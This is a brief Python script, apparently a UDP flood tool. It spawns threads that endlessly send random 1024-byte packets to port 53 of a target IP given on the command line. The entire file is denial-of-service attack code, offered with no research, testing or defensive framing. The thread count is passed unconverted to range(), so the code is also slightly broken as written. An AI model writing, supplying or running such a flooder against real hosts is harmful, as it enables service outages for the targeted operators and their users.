import socket
from os import urandom as _urandom
import random
import threading
import sys

UDP_IP = sys.argv[1]
THREADS = sys.argv[2]
UDP_PORT = 53

def udp():
    while True:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            address = (UDP_IP, UDP_PORT)
            sock.sendto(random._urandom(1024), address)
            for i in range(3):
                sock.sendto(random._urandom(1024), address)
        except:
            sock.close()
            print("Error")

if __name__ == "__main__":
    for i in range(THREADS):
        t = threading.Thread(target=udp)
        t.start()